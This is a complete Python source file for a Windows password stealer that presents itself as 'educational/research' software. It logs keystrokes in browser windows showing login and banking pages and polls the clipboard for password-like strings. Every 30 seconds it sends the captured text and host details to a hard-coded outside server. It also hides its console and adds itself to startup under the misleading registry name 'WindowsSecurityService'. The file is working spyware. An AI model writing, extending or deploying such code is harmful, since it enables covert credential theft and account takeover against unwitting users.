"""
Real-time Password Capture Module for Windows
- Runs as a background service/process
- Captures passwords as users type them in browsers
- Uses keyboard hooking and window monitoring
- Sends captured credentials to backend server in real-time

WARNING: This is for EDUCATIONAL/RESEARCH purposes only.
Unauthorized access to computer systems is illegal.
"""

import os
import sys
import json
import time
import threading
import platform
import requests
import re
from datetime import datetime
from collections import deque

# Backend server URL
BACKEND_URL = "https://clownfish-app-5kdkx.ondigitalocean.app"

# Buffer settings
SEND_INTERVAL = 30  # Send data every 30 seconds
MAX_BUFFER_SIZE = 100  # Maximum captures to buffer before sending

# Captured data buffer
captured_passwords = deque(maxlen=MAX_BUFFER_SIZE)
captured_keystrokes = []
current_window = ""
last_send_time = time.time()

# Password field detection patterns
PASSWORD_PATTERNS = [
    r'password', r'passwd', r'pwd', r'pass',
    r'secret', r'pin', r'token', r'auth',
    r'credential', r'login', r'signin'
]

# Browser window patterns to monitor
BROWSER_PATTERNS = [
    'chrome', 'firefox', 'edge', 'opera', 'brave',
    'vivaldi', 'safari', 'chromium', 'browser'
]

# Login page URL patterns
LOGIN_URL_PATTERNS = [
    r'login', r'signin', r'sign-in', r'log-in',
    r'auth', r'account', r'session', r'oauth',
    r'facebook\.com', r'google\.com', r'twitter\.com',
    r'instagram\.com', r'linkedin\.com', r'github\.com',
    r'amazon\.com', r'paypal\.com', r'bank'
]


def get_system_info():
    """Get basic system information"""
    return {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.architecture()[0],
        "username": os.getenv("USERNAME") or os.getenv("USER"),
        "timestamp": datetime.now().isoformat()
    }


def is_browser_window(window_title):
    """Check if the current window is a browser"""
    window_lower = window_title.lower()
    return any(browser in window_lower for browser in BROWSER_PATTERNS)


def is_login_page(window_title):
    """Check if the window title suggests a login page"""
    window_lower = window_title.lower()
    return any(re.search(pattern, window_lower) for pattern in LOGIN_URL_PATTERNS)


def send_to_backend(data):
    """Send captured data to backend server"""
    try:
        url = f"{BACKEND_URL}/api/browser-data"
        
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        response = requests.post(url, json=data, headers=headers, timeout=30)
        
        if response.status_code == 201:
            print(f"[+] Data sent successfully at {datetime.now().strftime('%H:%M:%S')}")
            return True
        else:
            print(f"[!] Failed to send. Status: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"[!] Error sending data: {e}")
        return False


def flush_buffer():
    """Send buffered data to backend"""
    global captured_passwords, last_send_time
    
    if not captured_passwords:
        return
    
    # Prepare data for sending
    data = {
        "system_info": get_system_info(),
        "passwords": {
            "data": list(captured_passwords),
            "total_count": len(captured_passwords),
            "capture_type": "realtime"
        },
        "cookies": {"data": [], "total_count": 0},
        "history": {"data": [], "total_count": 0},
        "tokens": {"data": [], "total_count": 0},
        "extraction_timestamp": datetime.now().isoformat()
    }
    
    if send_to_backend(data):
        captured_passwords.clear()
    
    last_send_time = time.time()


def periodic_sender():
    """Background thread to periodically send buffered data"""
    while True:
        time.sleep(SEND_INTERVAL)
        if captured_passwords:
            flush_buffer()


class KeyboardCapture:
    """
    Keyboard capture class using low-level Windows hooks
    Captures keystrokes when browser password fields are active
    """
    
    def __init__(self):
        self.current_input = ""
        self.current_window = ""
        self.current_url = ""
        self.is_password_field = False
        self.last_key_time = time.time()
        self.input_timeout = 5  # seconds
        
    def on_key_press(self, key):
        """Handle key press event"""
        try:
            # Get current window
            current_win = self.get_active_window()
            
            # Check if window changed
            if current_win != self.current_window:
                self.save_current_input()
                self.current_window = current_win
                self.current_input = ""
            
            # Only capture in browser windows
            if not is_browser_window(current_win):
                return
            
            # Check for input timeout (user paused typing)
            if time.time() - self.last_key_time > self.input_timeout:
                self.save_current_input()
                self.current_input = ""
            
            self.last_key_time = time.time()
            
            # Handle special keys
            key_str = str(key)
            
            if hasattr(key, 'char') and key.char:
                self.current_input += key.char
            elif 'enter' in key_str.lower():
                # Enter pressed - likely form submission
                self.save_current_input(is_submit=True)
                self.current_input = ""
            elif 'backspace' in key_str.lower():
                self.current_input = self.current_input[:-1]
            elif 'tab' in key_str.lower():
                # Tab - might be moving between fields
                self.save_current_input()
                self.current_input = ""
            elif 'space' in key_str.lower():
                self.current_input += " "
                
        except Exception as e:
            pass
    
    def get_active_window(self):
        """Get the currently active window title"""
        try:
            if platform.system() == "Windows":
                import ctypes
                from ctypes import wintypes
                
                user32 = ctypes.windll.user32
                
                # Get foreground window
                hwnd = user32.GetForegroundWindow()
                
                # Get window title
                length = user32.GetWindowTextLengthW(hwnd)
                buffer = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(hwnd, buffer, length + 1)
                
                return buffer.value
        except:
            pass
        return ""
    
    def save_current_input(self, is_submit=False):
        """Save current input if it looks like credentials"""
        if not self.current_input or len(self.current_input) < 4:
            return
        
        # Check if this looks like a password (on a login page)
        if is_login_page(self.current_window):
            capture_data = {
                "window_title": self.current_window,
                "captured_text": self.current_input,
                "is_submit": is_submit,
                "timestamp": datetime.now().isoformat(),
                "capture_method": "keyboard_hook"
            }
            
            captured_passwords.append(capture_data)
            print(f"[*] Captured input from: {self.current_window[:50]}...")
    
    def start_capture(self):
        """Start keyboard capture using pynput"""
        try:
            from pynput import keyboard
            
            with keyboard.Listener(on_press=self.on_key_press) as listener:
                listener.join()
        except ImportError:
            print("[!] pynput not installed. Using alternative method...")
            self.start_capture_win32()
    
    def start_capture_win32(self):
        """Alternative capture method using win32 hooks"""
        try:
            import ctypes
            from ctypes import wintypes, CFUNCTYPE, POINTER, c_int, c_void_p
            
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            
            WH_KEYBOARD_LL = 13
            WM_KEYDOWN = 0x0100
            
            # Callback type
            HOOKPROC = CFUNCTYPE(c_int, c_int, wintypes.WPARAM, wintypes.LPARAM)
            
            class KBDLLHOOKSTRUCT(ctypes.Structure):
                _fields_ = [
                    ("vkCode", wintypes.DWORD),
                    ("scanCode", wintypes.DWORD),
                    ("flags", wintypes.DWORD),
                    ("time", wintypes.DWORD),
                    ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
                ]
            
            def keyboard_callback(nCode, wParam, lParam):
                if nCode >= 0 and wParam == WM_KEYDOWN:
                    kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
                    vk_code = kb.vkCode
                    
                    # Convert virtual key to character
                    char = self.vk_to_char(vk_code)
                    if char:
                        self.process_key(char, vk_code)
                
                return user32.CallNextHookEx(None, nCode, wParam, lParam)
            
            # Set hook
            callback = HOOKPROC(keyboard_callback)
            hook = user32.SetWindowsHookExA(WH_KEYBOARD_LL, callback, kernel32.GetModuleHandleW(None), 0)
            
            if not hook:
                print("[!] Failed to set keyboard hook")
                return
            
            print("[*] Keyboard hook installed successfully")
            
            # Message loop
            msg = wintypes.MSG()
            while user32.GetMessageA(ctypes.byref(msg), None, 0, 0):
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageA(ctypes.byref(msg))
            
            # Cleanup
            user32.UnhookWindowsHookEx(hook)
            
        except Exception as e:
            print(f"[!] Win32 hook error: {e}")
    
    def vk_to_char(self, vk_code):
        """Convert virtual key code to character"""
        try:
            import ctypes
            
            # Check shift state
            user32 = ctypes.windll.user32
            shift_state = user32.GetKeyState(0x10) & 0x8000  # VK_SHIFT
            caps_state = user32.GetKeyState(0x14) & 0x0001   # VK_CAPITAL
            
            # Alphanumeric keys
            if 0x30 <= vk_code <= 0x39:  # 0-9
                return chr(vk_code)
            elif 0x41 <= vk_code <= 0x5A:  # A-Z
                char = chr(vk_code)
                if shift_state or caps_state:
                    return char.upper()
                return char.lower()
            elif vk_code == 0x0D:  # Enter
                return "[ENTER]"
            elif vk_code == 0x08:  # Backspace
                return "[BACKSPACE]"
            elif vk_code == 0x09:  # Tab
                return "[TAB]"
            elif vk_code == 0x20:  # Space
                return " "
            
            # Special characters
            special_keys = {
                0xBD: "-", 0xBB: "=", 0xDB: "[", 0xDD: "]",
                0xDC: "\\", 0xBA: ";", 0xDE: "'", 0xBC: ",",
                0xBE: ".", 0xBF: "/", 0xC0: "`"
            }
            
            if vk_code in special_keys:
                return special_keys[vk_code]
            
        except:
            pass
        return None
    
    def process_key(self, char, vk_code):
        """Process captured key"""
        current_win = self.get_active_window()
        
        if not is_browser_window(current_win):
            return
        
        if current_win != self.current_window:
            self.save_current_input()
            self.current_window = current_win
            self.current_input = ""
        
        if char == "[ENTER]":
            self.save_current_input(is_submit=True)
            self.current_input = ""
        elif char == "[BACKSPACE]":
            self.current_input = self.current_input[:-1]
        elif char == "[TAB]":
            self.save_current_input()
            self.current_input = ""
        else:
            self.current_input += char


class ClipboardMonitor:
    """
    Monitor clipboard for copied passwords
    Many users copy-paste passwords from password managers
    """
    
    def __init__(self):
        self.last_clipboard = ""
    
    def start_monitoring(self):
        """Start clipboard monitoring"""
        try:
            if platform.system() == "Windows":
                import ctypes
                
                user32 = ctypes.windll.user32
                kernel32 = ctypes.windll.kernel32
                
                CF_UNICODETEXT = 13
                
                while True:
                    time.sleep(1)
                    
                    try:
                        user32.OpenClipboard(0)
                        
                        if user32.IsClipboardFormatAvailable(CF_UNICODETEXT):
                            data = user32.GetClipboardData(CF_UNICODETEXT)
                            
                            if data:
                                text = ctypes.c_wchar_p(data).value
                                
                                if text and text != self.last_clipboard:
                                    self.last_clipboard = text
                                    self.check_password(text)
                        
                        user32.CloseClipboard()
                        
                    except:
                        try:
                            user32.CloseClipboard()
                        except:
                            pass
                        
        except Exception as e:
            print(f"[!] Clipboard monitor error: {e}")
    
    def check_password(self, text):
        """Check if clipboard content looks like a password"""
        # Password-like patterns: 8+ chars, mix of chars/numbers/symbols
        if len(text) >= 8 and len(text) <= 128:
            has_upper = any(c.isupper() for c in text)
            has_lower = any(c.islower() for c in text)
            has_digit = any(c.isdigit() for c in text)
            has_special = any(not c.isalnum() for c in text)
            
            # Looks like a password if it has mixed characters
            if (has_upper or has_lower) and (has_digit or has_special):
                # Don't capture if it's a URL or path
                if not text.startswith('http') and '\\' not in text and '/' not in text:
                    capture_data = {
                        "source": "clipboard",
                        "captured_text": text,
                        "timestamp": datetime.now().isoformat(),
                        "capture_method": "clipboard_monitor"
                    }
                    
                    captured_passwords.append(capture_data)
                    print(f"[*] Captured potential password from clipboard")


def hide_console():
    """Hide the console window (run silently)"""
    try:
        if platform.system() == "Windows":
            import ctypes
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
    except:
        pass


def add_to_startup():
    """Add to Windows startup for persistence"""
    try:
        if platform.system() == "Windows":
            import winreg
            
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            # Get current executable path
            exe_path = sys.executable
            script_path = os.path.abspath(__file__)
            
            # Create startup command
            startup_cmd = f'"{exe_path}" "{script_path}"'
            
            # Add to registry
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsSecurityService", 0, winreg.REG_SZ, startup_cmd)
            winreg.CloseKey(key)
            
            print("[+] Added to startup")
            return True
    except Exception as e:
        print(f"[!] Failed to add to startup: {e}")
    return False


def run_as_service():
    """Run the capture modules as background service"""
    print("""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║           Real-time Password Capture Service v1.0                 ║
    ║                                                                   ║
    ║  Modes:                                                           ║
    ║  • Keyboard Hook   - Captures keystrokes in browser              ║
    ║  • Clipboard Watch - Monitors for copy-pasted passwords          ║
    ║  • Auto-Send       - Sends to backend every 30 seconds           ║
    ║                                                                   ║
    ║  [!] For Educational/Research Purposes Only                       ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """)
    
    if platform.system() != "Windows":
        print("[!] This module requires Windows OS")
        return
    
    print(f"[*] System: {platform.node()}")
    print(f"[*] User: {os.getenv('USERNAME')}")
    print(f"[*] Backend: {BACKEND_URL}")
    print()
    
    # Start periodic sender thread
    sender_thread = threading.Thread(target=periodic_sender, daemon=True)
    sender_thread.start()
    print("[+] Background sender started")
    
    # Start clipboard monitor in thread
    clipboard_monitor = ClipboardMonitor()
    clipboard_thread = threading.Thread(target=clipboard_monitor.start_monitoring, daemon=True)
    clipboard_thread.start()
    print("[+] Clipboard monitor started")
    
    # Start keyboard capture (main thread - blocks)
    print("[+] Keyboard capture starting...")
    print("[*] Monitoring for password inputs in browsers...")
    print()
    
    keyboard_capture = KeyboardCapture()
    keyboard_capture.start_capture()


def run_silent():
    """Run in silent/hidden mode"""
    hide_console()
    add_to_startup()
    run_as_service()


def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Password Capture Service")
    parser.add_argument('--silent', '-s', action='store_true', help='Run in silent mode')
    parser.add_argument('--startup', action='store_true', help='Add to Windows startup')
    parser.add_argument('--no-keyboard', action='store_true', help='Disable keyboard capture')
    
    args = parser.parse_args()
    
    if args.startup:
        add_to_startup()
        return
    
    if args.silent:
        run_silent()
    else:
        run_as_service()


if __name__ == "__main__":
    main()
